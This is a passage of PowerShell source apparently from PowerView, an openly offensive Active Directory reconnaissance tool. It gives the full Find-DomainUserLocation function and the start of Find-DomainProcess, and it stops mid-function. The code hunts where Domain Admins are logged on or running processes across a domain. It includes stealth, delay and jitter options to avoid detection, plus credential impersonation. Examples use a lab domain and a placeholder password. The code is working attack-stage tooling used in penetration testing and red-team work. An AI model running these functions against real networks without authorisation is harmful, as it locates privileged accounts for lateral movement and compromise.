.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER StopOnSuccess

Switch. Stop hunting after finding after finding a target user.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER ShowAll

Switch. Return all user location results instead of filtering based on target
specifications.

.PARAMETER Stealth

Switch. Only enumerate sessions from connonly used target servers.

.PARAMETER StealthSource

The source of target servers to use, 'DFS' (distributed file servers),
'DC' (domain controllers), 'File' (file servers), or 'All' (the default).

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-DomainUserLocation

Searches for 'Domain Admins' by enumerating every computer in the domain.

.EXAMPLE

Find-DomainUserLocation -Stealth -ShowAll

Enumerates likely highly-trafficked servers, performs just session enumeration
against each, and outputs all results.

.EXAMPLE

Find-DomainUserLocation -UserAdminCount -ComputerOperatingSystem 'Windows 7*' -Domain dev.testlab.local

Enumerates Windows 7 computers in dev.testlab.local and returns user results for privileged
users in dev.testlab.local.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-DomainUserLocation -Domain testlab.local -Credential $Cred

Searches for domain admin locations in the testlab.local using the specified alternate credentials.

.OUTPUTS

PowerView.UserLocation
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserLocation')]
    [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [Alias('Unconstrained')]
        [Switch]
        $ComputerUnconstrained,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,

        [Parameter(ParameterSetName = 'UserGroupIdentity')]
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',

        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,

        [Alias('AllowDelegation')]
        [Switch]
        $UserAllowDelegation,

        [Switch]
        $CheckAccess,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Parameter(ParameterSetName = 'ShowAll')]
        [Switch]
        $ShowAll,

        [Switch]
        $Stealth,

        [String]
        [ValidateSet('DFS', 'DC', 'File', 'All')]
        $StealthSource = 'All',

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {

        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $ComputerSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        $UserSearcherArguments = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $UserSearcherArguments['Identity'] = $UserIdentity }
        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['UserDomain']) { $UserSearcherArguments['Domain'] = $UserDomain }
        if ($PSBoundParameters['UserLDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $UserLDAPFilter }
        if ($PSBoundParameters['UserSearchBase']) { $UserSearcherArguments['SearchBase'] = $UserSearchBase }
        if ($PSBoundParameters['UserAdminCount']) { $UserSearcherArguments['AdminCount'] = $UserAdminCount }
        if ($PSBoundParameters['UserAllowDelegation']) { $UserSearcherArguments['AllowDelegation'] = $UserAllowDelegation }
        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }

        $TargetComputers = @()

        # first, build the set of computers to enumerate
        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = @($ComputerName)
        }
        else {
            if ($PSBoundParameters['Stealth']) {
                Write-Verbose "[Find-DomainUserLocation] Stealth enumeration using source: $StealthSource"
                $TargetComputerArrayList = New-Object System.Collections.ArrayList

                if ($StealthSource -match 'File|All') {
                    Write-Verbose '[Find-DomainUserLocation] Querying for file servers'
                    $FileServerSearcherArguments = @{}
                    if ($PSBoundParameters['Domain']) { $FileServerSearcherArguments['Domain'] = $Domain }
                    if ($PSBoundParameters['ComputerDomain']) { $FileServerSearcherArguments['Domain'] = $ComputerDomain }
                    if ($PSBoundParameters['ComputerSearchBase']) { $FileServerSearcherArguments['SearchBase'] = $ComputerSearchBase }
                    if ($PSBoundParameters['Server']) { $FileServerSearcherArguments['Server'] = $Server }
                    if ($PSBoundParameters['SearchScope']) { $FileServerSearcherArguments['SearchScope'] = $SearchScope }
                    if ($PSBoundParameters['ResultPageSize']) { $FileServerSearcherArguments['ResultPageSize'] = $ResultPageSize }
                    if ($PSBoundParameters['ServerTimeLimit']) { $FileServerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
                    if ($PSBoundParameters['Tombstone']) { $FileServerSearcherArguments['Tombstone'] = $Tombstone }
                    if ($PSBoundParameters['Credential']) { $FileServerSearcherArguments['Credential'] = $Credential }
                    $FileServers = Get-DomainFileServer @FileServerSearcherArguments
                    if ($FileServers -isnot [System.Array]) { $FileServers = @($FileServers) }
                    $TargetComputerArrayList.AddRange( $FileServers )
                }
                if ($StealthSource -match 'DFS|All') {
                    Write-Verbose '[Find-DomainUserLocation] Querying for DFS servers'
                    # # TODO: fix the passed parameters to Get-DomainDFSShare
                    # $ComputerName += Get-DomainDFSShare -Domain $Domain -Server $DomainController | ForEach-Object {$_.RemoteServerName}
                }
                if ($StealthSource -match 'DC|All') {
                    Write-Verbose '[Find-DomainUserLocation] Querying for domain controllers'
                    $DCSearcherArguments = @{
                        'LDAP' = $True
                    }
                    if ($PSBoundParameters['Domain']) { $DCSearcherArguments['Domain'] = $Domain }
                    if ($PSBoundParameters['ComputerDomain']) { $DCSearcherArguments['Domain'] = $ComputerDomain }
                    if ($PSBoundParameters['Server']) { $DCSearcherArguments['Server'] = $Server }
                    if ($PSBoundParameters['Credential']) { $DCSearcherArguments['Credential'] = $Credential }
                    $DomainControllers = Get-DomainController @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
                    if ($DomainControllers -isnot [System.Array]) { $DomainControllers = @($DomainControllers) }
                    $TargetComputerArrayList.AddRange( $DomainControllers )
                }
                $TargetComputers = $TargetComputerArrayList.ToArray()
            }
            else {
                Write-Verbose '[Find-DomainUserLocation] Querying for all computers in the domain'
                $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
            }
        }
        Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-DomainUserLocation] No hosts found to enumerate'
        }

        # get the current user so we can ignore it in the results
        if ($PSBoundParameters['Credential']) {
            $CurrentUser = $Credential.GetNetworkCredential().UserName
        }
        else {
            $CurrentUser = ([Environment]::UserName).ToLower()
        }

        # now build the user target set
        if ($PSBoundParameters['ShowAll']) {
            $TargetUsers = @()
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $GroupSearcherArguments = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $GroupSearcherArguments['Domain'] = $UserDomain }
            if ($PSBoundParameters['UserSearchBase']) { $GroupSearcherArguments['SearchBase'] = $UserSearchBase }
            if ($PSBoundParameters['Server']) { $GroupSearcherArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $GroupSearcherArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $GroupSearcherArguments['ResultPageSize'] = $ResultPageSize }
            if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }
            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        Write-Verbose "[Find-DomainUserLocation] TargetUsers length: $($TargetUsers.Length)"
        if ((-not $ShowAll) -and ($TargetUsers.Length -eq 0)) {
            throw '[Find-DomainUserLocation] No users found to target'
        }

        # the host enumeration block we're using to enumerate all servers
        $HostEnumBlock = {
            Param($ComputerName, $TargetUsers, $CurrentUser, $Stealth, $TokenHandle)

            if ($TokenHandle) {
                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $Sessions = Get-NetSession -ComputerName $TargetComputer
                    ForEach ($Session in $Sessions) {
                        $UserName = $Session.UserName
                        $CName = $Session.CName

                        if ($CName -and $CName.StartsWith('\\')) {
                            $CName = $CName.TrimStart('\')
                        }

                        # make sure we have a result, and ignore computer$ sessions
                        if (($UserName) -and ($UserName.Trim() -ne '') -and ($UserName -notmatch $CurrentUser) -and ($UserName -notmatch '\$$')) {

                            if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName)) {
                                $UserLocation = New-Object PSObject
                                $UserLocation | Add-Member Noteproperty 'UserDomain' $Null
                                $UserLocation | Add-Member Noteproperty 'UserName' $UserName
                                $UserLocation | Add-Member Noteproperty 'ComputerName' $TargetComputer
                                $UserLocation | Add-Member Noteproperty 'SessionFrom' $CName

                                # try to resolve the DNS hostname of $Cname
                                try {
                                    $CNameDNSName = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName
                                    $UserLocation | Add-Member NoteProperty 'SessionFromName' $CnameDNSName
                                }
                                catch {
                                    $UserLocation | Add-Member NoteProperty 'SessionFromName' $Null
                                }

                                # see if we're checking to see if we have local admin access on this machine
                                if ($CheckAccess) {
                                    $Admin = (Test-AdminAccess -ComputerName $CName).IsAdmin
                                    $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                }
                                else {
                                    $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Null
                                }
                                $UserLocation.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                $UserLocation
                            }
                        }
                    }
                    if (-not $Stealth) {
                        # if we're not 'stealthy', enumerate loggedon users as well
                        $LoggedOn = Get-NetLoggedon -ComputerName $TargetComputer
                        ForEach ($User in $LoggedOn) {
                            $UserName = $User.UserName
                            $UserDomain = $User.LogonDomain

                            # make sure wet have a result
                            if (($UserName) -and ($UserName.trim() -ne '')) {
                                if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName) -and ($UserName -notmatch '\$$')) {
                                    $IPAddress = @(Resolve-IPAddress -ComputerName $TargetComputer)[0].IPAddress
                                    $UserLocation = New-Object PSObject
                                    $UserLocation | Add-Member Noteproperty 'UserDomain' $UserDomain
                                    $UserLocation | Add-Member Noteproperty 'UserName' $UserName
                                    $UserLocation | Add-Member Noteproperty 'ComputerName' $TargetComputer
                                    $UserLocation | Add-Member Noteproperty 'IPAddress' $IPAddress
                                    $UserLocation | Add-Member Noteproperty 'SessionFrom' $Null
                                    $UserLocation | Add-Member Noteproperty 'SessionFromName' $Null

                                    # see if we're checking to see if we have local admin access on this machine
                                    if ($CheckAccess) {
                                        $Admin = Test-AdminAccess -ComputerName $TargetComputer
                                        $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                    }
                                    else {
                                        $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Null
                                    }
                                    $UserLocation.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                    $UserLocation
                                }
                            }
                        }
                    }
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainUserLocation] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-DomainUserLocation] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainUserLocation] Enumerating server $Computer ($Counter of $($TargetComputers.Count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetUsers, $CurrentUser, $Stealth, $LogonToken

                if ($Result -and $StopOnSuccess) {
                    Write-Verbose "[Find-DomainUserLocation] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[Find-DomainUserLocation] Using threading with threads: $Threads"
            Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length)"

            # if we're using threading, kick off the script block with New-ThreadedFunction
            $ScriptParams = @{
                'TargetUsers' = $TargetUsers
                'CurrentUser' = $CurrentUser
                'Stealth' = $Stealth
                'TokenHandle' = $LogonToken
            }

            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Find-DomainProcess {
<#
.SYNOPSIS

Searches for processes on the domain using WMI, returning processes
that match a particular user specification or process name.

Thanks to @paulbrandau for the approach idea.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Get-DomainUser, Get-DomainGroupMember, Get-WMIProcess, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and queries the domain for users of a specified group
(default 'Domain Admins') with Get-DomainGroupMember. Then for each server the
function enumerates any current processes running with Get-WMIProcess,
searching for processes running under any target user contexts or with the
specified -ProcessName. If -Credential is passed, it is passed through to
the underlying WMI commands used to enumerate the remote machines.

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER Domain

Specifies the domain to query for computers AND users, defaults to the current domain.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.

.PARAMETER ComputerUnconstrained

Switch. Search computer objects that have unconstrained delegation.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER ProcessName

Search for processes with one or more specific names.

.PARAMETER UserIdentity

Specifies one or more user identities to search for.

.PARAMETER UserDomain

Specifies the domain to query for users to search for, defaults to the current domain.

.PARAMETER UserLDAPFilter

Specifies an LDAP query string that is used to search for target users.

.PARAMETER UserSearchBase

Specifies the LDAP source to search through for target users.
e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.

.PARAMETER UserGroupIdentity

Specifies a group identity to query for target users, defaults to 'Domain Admins.
If any other user specifications are set, then UserGroupIdentity is ignored.

.PARAMETER UserAdminCount

Switch. Search for users users with '(adminCount=1)' (meaning are/were privileged).

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER StopOnSuccess

Switch. Stop hunting after finding after finding a target user.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-DomainProcess

Searches for processes run by 'Domain Admins' by enumerating every computer in the domain.

.EXAMPLE

Find-DomainProcess -UserAdminCount -ComputerOperatingSystem 'Windows 7*' -Domain dev.testlab.local

Enumerates Windows 7 computers in dev.testlab.local and returns any processes being run by
privileged users in dev.testlab.local.

.EXAMPLE

Find-DomainProcess -ProcessName putty.exe

Searchings for instances of putty.exe running on the current domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-DomainProcess -Domain testlab.local -Credential $Cred

Searches processes being run by 'domain admins' in the testlab.local using the specified alternate credentials.

.OUTPUTS

PowerView.UserProcess
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [Alias('Unconstrained')]
        [Switch]
        $ComputerUnconstrained,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Parameter(ParameterSetName = 'TargetProcess')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ProcessName,

        [Parameter(ParameterSetName = 'TargetUser')]
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',

        [Parameter(ParameterSetName = 'TargetUser')]
        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $ComputerSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        $UserSearcherArguments = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $UserSearcherArguments['Identity'] = $UserIdentity }
        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['UserDomain']) { $UserSearcherArguments['Domain'] = $UserDomain }
        if ($PSBoundParameters['UserLDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $UserLDAPFilter }
        if ($PSBoundParameters['UserSearchBase']) { $UserSearcherArguments['SearchBase'] = $UserSearchBase }
        if ($PSBoundParameters['UserAdminCount']) { $UserSearcherArguments['AdminCount'] = $UserAdminCount }
        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }


        # first, build the set of computers to enumerate
        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose '[Find-DomainProcess] Querying computers in the domain'
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainProcess] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-DomainProcess] No hosts found to enumerate'
        }

        # now build the user target set
        if ($PSBoundParameters['ProcessName']) {
            $TargetProcessName = @()
            ForEach ($T in $ProcessName) {
                $TargetProcessName += $T.Split(',')
            }
            if ($TargetProcessName -isnot [System.Array]) {
                $TargetProcessName = [String[]] @($TargetProcessName)
            }
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $GroupSearcherArguments = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $GroupSearcherArguments['Domain'] = $UserDomain }
            if ($PSBoundParameters['UserSearchBase']) { $GroupSearcherArguments['SearchBase'] = $UserSearchBase }
            if ($PSBoundParameters['Server']) { $GroupSearcherArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $GroupSearcherArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $GroupSearcherArguments['ResultPageSize'] = $ResultPageSize }
            if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }
            $GroupSearcherArguments
            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        # the host enumeration block we're using to enumerate all servers
        $HostEnumBlock = {
            Param($ComputerName, $ProcessName, $TargetUsers, $Credential)

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    # try to enumerate all active processes on the remote host
                    # and search for a specific process name
                    if ($Credential) {
                        $Processes = Get-WMIProcess -Credential $Credential -ComputerName $TargetComputer -ErrorAction SilentlyContinue
                    }
                    else {
                        $Processes = Get-WMIProcess -ComputerName $TargetComputer -ErrorAction SilentlyContinue
                    }
                    ForEach ($Process in $Processes) {
                        # if we're hunting for a process name or comma-separated names
                        if ($ProcessName) {
                            if ($ProcessName -Contains $Process.ProcessName) {
                                $Process
                            }
                        }
                        # if the session user is in the target list, display some output
                        elseif ($TargetUsers -Contains $Process.User) {
                            $Process
                        }
                    }
                }
            }
        }
    }

    PROCESS {
